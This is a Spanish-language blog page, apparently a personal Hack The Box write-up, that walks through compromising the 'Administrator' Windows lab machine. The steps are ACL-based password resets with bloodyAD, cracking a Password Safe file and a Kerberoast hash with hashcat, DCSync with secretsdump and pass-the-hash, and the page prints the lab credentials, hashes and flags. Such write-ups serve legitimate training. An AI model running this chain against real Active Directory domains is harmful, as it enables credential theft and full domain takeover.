@@ -1,0 +1,1196 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../">
+      
+      
+        <link rel="next" href="../babytwo/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/lucifer.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Administrator - Bitácora de javik</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../estilos/gruvbox.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#maquina-administrator" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../../.." title="Bitácora de javik" class="md-header__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../../assets/lucifer.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Bitácora de javik
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Administrator
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Bitácora de javik" class="md-nav__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../../assets/lucifer.png" alt="logo">
+
+    </a>
+    Bitácora de javik
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 Bitácora de javik
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💀 Máquinas HTB
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💀 Máquinas HTB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Administrator
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../babytwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BabyTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../delegate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Delegate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tombwatcher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TombWatcher
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../escapetwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    EscapeTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../breach/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Breach
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../media/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Media
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authority/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authority
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../herramientas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛠️ Herramientas
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🛠️ Herramientas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/nxc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NetExec (NXC)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/sliver-c2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sliver C2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/seimpersonate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SeImpersonatePrivilege
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/mssql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumeración MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/chisel-pivoting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chisel & Pivoting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../certificaciones/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏆 Certificaciones
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../mis-notas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mis Notas
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mis Notas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/configuracion-ad-basico/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuración de AD Básico
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/ataques-adcs-esc1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Abuso de AD CS (ESC1)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="maquina-administrator">Máquina: Administrator<a class="headerlink" href="#maquina-administrator" title="Permanent link">&para;</a></h1>
+<ul>
+<li><strong>Sistema Operativo:</strong> Windows</li>
+<li><strong>Dificultad:</strong> Media</li>
+<li><strong>Técnicas clave:</strong> Active Directory, bloodyAD, ACL manipulation, Shadow Credentials</li>
+</ul>
+<hr />
+<p><img alt="Pasted image 20260625194709.png" src="../assets/Pasted%20image%2020260625194709.png" /></p>
+<p>Como es común en las pruebas de Windows de la vida real, iniciará el cuadro Administrador con las credenciales para la siguiente cuenta: Nombre de usuario: Olivia Contraseña: ichliebedich</p>
+<p>fase uno reconocimiento:</p>
+<p><img alt="Pasted image 20260625200300.png" src="../assets/Pasted%20image%2020260625200300.png" /></p>
+<p>el escaneo mostro a administrator escuchando por ese puerto pero primero probar nuestro usuario y pass </p>
+<p><img alt="Pasted image 20260625200745.png" src="../assets/Pasted%20image%2020260625200745.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.18.160<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Olivia'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'ichliebedich'</span><span class="w"> </span>--shares
+</code></pre></div>
+<p>probamos que el usuario olivia pertenese los recursos compartidos no hay nada importante asi que nos descargamos la configuracion del ad con bloodhound</p>
+<p>pero primero agregamos el dminio al /etc/hosts/<img alt="Pasted image 20260625202716.png" src="../assets/Pasted%20image%2020260625202716.png" /></p>
+<p>comando y repo dela herramienta:
+https://github.com/gzzcoo/iRealm</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>iRealm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.129.18.160<span class="w"> </span>-d<span class="w"> </span>administrator.htb<span class="w"> </span>-n<span class="w"> </span>DC<span class="w"> </span>--force
+</code></pre></div>
+<p><img alt="Pasted image 20260625204036.png" src="../assets/Pasted%20image%2020260625204036.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.18.160<span class="w"> </span>-d<span class="w"> </span>administrator.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Olivia'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'ichliebedich'</span><span class="w"> </span>get<span class="w"> </span>bloodhound
+</code></pre></div>
+<p>podemos mirar que el usuario olivia tiene la acl de cambiar la contrasena de el usuario michael asi que la cambiamos</p>
+<p><img alt="Pasted image 20260625205320.png" src="../assets/Pasted%20image%2020260625205320.png" /></p>
+<p><img alt="Pasted image 20260625205842.png" src="../assets/Pasted%20image%2020260625205842.png" /></p>
+<p>comandos:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.18.160<span class="w"> </span>-d<span class="w"> </span>administrator.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Olivia'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'ichliebedich'</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span><span class="s1">'Michael'</span><span class="w"> </span><span class="s1">'pepe123'</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.18.160<span class="w"> </span>-u<span class="w"> </span><span class="s1">'michael'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'pepe123'</span><span class="w"> </span>--shares
+</code></pre></div>
+<p>ya en el blood miramos que el usuario michael tiene acl de  ForceChangePassword sobre el usuario benjamin asi que le cambiamos la pass</p>
+<p><img alt="Pasted image 20260625210359.png" src="../assets/Pasted%20image%2020260625210359.png" /></p>
+<p><img alt="Pasted image 20260625210831.png" src="../assets/Pasted%20image%2020260625210831.png" /></p>
+<p>comandos:</p>
+<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.18.160<span class="w"> </span>-d<span class="w"> </span>administrator.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Michael'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'pepe123'</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span><span class="s1">'Benjamin'</span><span class="w"> </span><span class="s1">'setensa1'</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.18.160<span class="w"> </span>-u<span class="w"> </span><span class="s1">'benjamin'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'setensa1'</span><span class="w"> </span>--shares
+</code></pre></div>
+<p>ya luego de eso miramos que benjamin pertenese a un grupo que no es normal<img alt="Pasted image 20260625211450.png" src="../assets/Pasted%20image%2020260625211450.png" /></p>
+<p>si miramos orita lo primero pudimos ver que algo en ftp estaba escuchado como administrator asi que con este usuario y su pass intentamos entrar  </p>
+<div class="highlight"><pre><span></span><code>ftp 10.129.18.160
+</code></pre></div>
+<p>usuario: benjamin
+pass: setensa1</p>
+<p><img alt="Pasted image 20260625215023.png" src="../assets/Pasted%20image%2020260625215023.png" /></p>
+<p>descargamos un archivo llamado <code>Backup.psafe3</code> al abrir el archivo nos topamos con esto
+<img alt="Pasted image 20260625215747.png" src="../assets/Pasted%20image%2020260625215747.png" /></p>
+<p>el archivo esta en psafe3 pero que es esto</p>
+<p><code>.psafe3</code> es la extensión de archivo de <strong>Password Safe 3</strong>, que es un gestor de contraseñas (como KeePass, 1Password, etc.).</p>
+<p><strong>Password Safe</strong> es un programa que:</p>
+<ul>
+<li>Guarda contraseñas encriptadas en un archivo</li>
+<li>Las protege con una <strong>Master Password</strong> (contraseña maestra)</li>
+<li>Permite organizar credenciales por categorías</li>
+</ul>
+<p>El archivo <code>.psafe3</code> contiene:</p>
+<ul>
+<li>Contraseñas guardadas</li>
+<li>Nombres de usuario</li>
+<li>URLs</li>
+<li>Notas</li>
+<li>Organizadas en carpetas</li>
+</ul>
+<p>asi que tenemos que romperlo</p>
+<p><img alt="Pasted image 20260625220108.png" src="../assets/Pasted%20image%2020260625220108.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<p>y la pass es : tekieromucho</p>
+<p>asi que miramos que hay en el safe  al entrar nos pedira pass ponemos la de te quiero mucho 
+<img alt="Pasted image 20260625221927.png" src="../assets/Pasted%20image%2020260625221927.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>pwsafe ~/administrator/content/Backup.psafe3
+</code></pre></div>
+<p><img alt="Pasted image 20260625222146.png" src="../assets/Pasted%20image%2020260625222146.png" /></p>
+<p>le damos clik derecho a emily y copiamos la pass luego la berificamos</p>
+<p><img alt="Pasted image 20260625222351.png" src="../assets/Pasted%20image%2020260625222351.png" /></p>
+<p>nos conectamos por evil y sacamos la primera flag<img alt="Pasted image 20260625222739.png" src="../assets/Pasted%20image%2020260625222739.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>evil-winrm -i 10.129.18.160 -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>type user.txt
+</code></pre></div>
+<p><img alt="Pasted image 20260625222852.png" src="../assets/Pasted%20image%2020260625222852.png" /></p>
+<p>flag: aa0ba54f43d46d5e7f96cb832ad2b5ca</p>
+<p>luego en el blood miramos que emyli tiene acl de generi write sobre el usuario etha <img alt="Pasted image 20260625223526.png" src="../assets/Pasted%20image%2020260625223526.png" /></p>
+<p>para abusar de esto ala cuenta de Ethan sele agrega un spn y se berifica que se agrego<img alt="Pasted image 20260625235058.png" src="../assets/Pasted%20image%2020260625235058.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>Set-ADUser -Identity ethan -ServicePrincipalNames @{Add="HTTP/ethan.administrator.htb"}
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Get-ADUser ethan -Properties serviceprincipalname | Select-Object serviceprincipalname
+</code></pre></div>
+<p>ya luego se se sincroniza el relo y se ejecuta este comando para obtener el ntlmv2 para romper<img alt="Pasted image 20260626070151.png" src="../assets/Pasted%20image%2020260626070151.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>systemctl<span class="w"> </span>stop<span class="w"> </span>systemd-timesyncd
+sudo<span class="w"> </span>ntpdate<span class="w"> </span>-s<span class="w"> </span><span class="m">10</span>.129.18.160
+timedatectl
+</code></pre></div>
+<p>nota estos comandos no son casi funcionales al 100 por que tube muchos problemas al sincronizar la ora</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>targetedKerberoast.py<span class="w"> </span>--dc-ip<span class="w"> </span><span class="m">10</span>.129.18.160<span class="w"> </span>-d<span class="w"> </span>administrator.htb<span class="w"> </span>-k<span class="w"> </span>-U<span class="w"> </span>ethan.txt
+</code></pre></div>
+<p>guardamos y rompemos<img alt="Pasted image 20260626071038.png" src="../assets/Pasted%20image%2020260626071038.png" /> </p>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">'$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$8580eb6354f34014cbb4bf491f75a83e$bd86ef25d806cdbd468d2887bd3032475d1caaf3845fab9e09e5e7be64a595b740714668ad86abfce742bf45c835c1e882907740165c2b699945d82e046ddca34be464d42d11e2c24a498f58c9df67ad63ab5d1d09dfe660dcda03c589e380411880d0f1b3010a3a4555c8136dfd8b49bf21da8b395761557e7d090ab9c33fb7db73401dd7e062f4067005d6e0ac7a3a90f550e38932bf3a1e0a0225545a075a5ab5562341735b623f5592a2b392a8d677569ab10ac34d48479eec9ff5dfa0ba8a2bfdac8967fa27c270ba5fde54510f300b354095bbd7eb002535e73ceea8120a47624208f4ca2632e0b304709e2f3c5f8b303fd4e5cca6c3771aadcf893f6ba6c78b4c2e257eb277dd9385a7f54a5b5e0ba00d17b5998e1ae359cf7f4d77fa5252a0548f31958ae6590821b093bb229aeab84e736866c9e60f48ad55aa433e5fa874a131814a832e9e035bed249fcbf4c64190edfd392e40b740a45b3aa0ec71e4fcf25b2613eb32f333c24ede8cc92331d271cb62d1772631f2fc0ad3d3b4c0799f79ec751f120ed4839a4aa20c4f9eb51cffe3598bd7f10dc30fdd2e83680a3601b9df62cb5da4f892665f976f018533db3343a524d68f726e1a545501eadda0aa1bd5e5d1c92f0a68db5ac8e543167a51ac2f76f4fabe7d54131fcd5f4ac47f27e1eb28437660bde2981aaa1ba9df956b58117700e2b37cc40b90a6e27ba45d7dfa66deb32ec0b907e3def172acfda8631024a9dfd39040093f0d3c35b5a96d7e5a313b9124ffe353badb14776e51f7d7a5812aec9d0eb4dc1aa5da786cd811d4d4d73d57378dd814941fb2403b45afc57580e49a08ab62d21c2c86140fa8f1709361dad7ecc494d476c856b368563c851d416ca4396dda4a228c55731cb7bc53d6d94dfe97c4e85f1890946608f8097f881bbf64a0926c6fafd2196bb77d2b6b56a4733c18e8f8c8190a6c1db0a93ffb0586a49ea26ec945973165974d6e6e99a574fbfda75d34f4e87006cd2fcc6bfd316a4be4a2ad1a47368579031fbd2abf0a86a79a89f12fcae7802e7da4b59570952dcd1f2e9521ae30bd0fa97fd1f284aeb3067c7e62b03f99cd206674792f90941f7b083f72cb1777969046d198ab0939935ef25e34705c7ef497be7c3899cd4a8eae4522e7c2feab74736dd445b9b0e4cb137abbd9fa5370ece8f3af2c09567a8a6d9ab79efd58446bafdf929a0dff8e149d5eea686bc2e5f963ff4ba1348e93ef97d23ec444f361089495221d6910cb0286b563e7ecbc935cb61b8ffa1cbedcccac75d402a7f52d2113ae03548d217e42e671a00420f240fb94837ef59b1adda8535d7566f18a31b3dafeb4d44c8a783505267b65a586faa098264e0fd07bc4c13780590fc1d30d12f8ac72eba3f839af2c38d774e40ecc3707cb458652c79a00d43dc2299ff4cec5a749a2b5d405f3661c05696f74690ec5d18c9c5716fc876730b4c4fd1e7581edba35a70ec585bcded3ff85b962a062d18382523d33fc1fd4088de3bbcf0858c070d1'</span><span class="w"> </span>&gt;<span class="w"> </span>ethan_hash.txt
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>ethan_hash.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<p><img alt="Pasted image 20260626071314.png" src="../assets/Pasted%20image%2020260626071314.png" /></p>
+<p>pass: limpbizkit</p>
+<p>probamos y funciona<img alt="Pasted image 20260626071550.png" src="../assets/Pasted%20image%2020260626071550.png" /></p>
+<p>ya como este usuario en blood nos dise que tenemos DCSync pero que es esto 
+<strong>DCSync</strong> es un ataque que aprovecha los permisos de replicación de Active Directory.</p>
+<p><strong>¿Qué es?</strong></p>
+<ul>
+<li>Normalmente solo los Domain Controllers pueden <strong>replicar datos</strong> (sincronizarse) del directorio</li>
+<li>DCSync permite a un usuario <strong>impersonar un Domain Controller</strong> y solicitar los hashes de contraseña de <strong>TODOS los usuarios</strong></li>
+</ul>
+<p><img alt="Pasted image 20260626072221.png" src="../assets/Pasted%20image%2020260626072221.png" /></p>
+<p>sabiendo esto sacamos los hash ntlm <img alt="Pasted image 20260626072630.png" src="../assets/Pasted%20image%2020260626072630.png" /></p>
+<p>comando:</p>
+<div class="highlight"><pre><span></span><code>secretsdump.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.18.160<span class="w"> </span>administrator.htb/ethan:limpbizkit@10.129.18.160
+</code></pre></div>
+<p>asemos pass the hash con admin </p>
+<p><img alt="Pasted image 20260626073413.png" src="../assets/Pasted%20image%2020260626073413.png" /></p>
+<div class="highlight"><pre><span></span><code>evil-winrm -i 10.129.18.160 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
+</code></pre></div>
+<p><img alt="Pasted image 20260626073529.png" src="../assets/Pasted%20image%2020260626073529.png" /></p>
+<p>flag root: b48594654dcd1883ea401061be3763cf</p>
+<p>echa por: JAVIKRD</p>
+<p><img alt="Pasted image 20260626075813.png" src="../assets/Pasted%20image%2020260626075813.png" /></p>
+<p>Windows Privilege Escalation</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
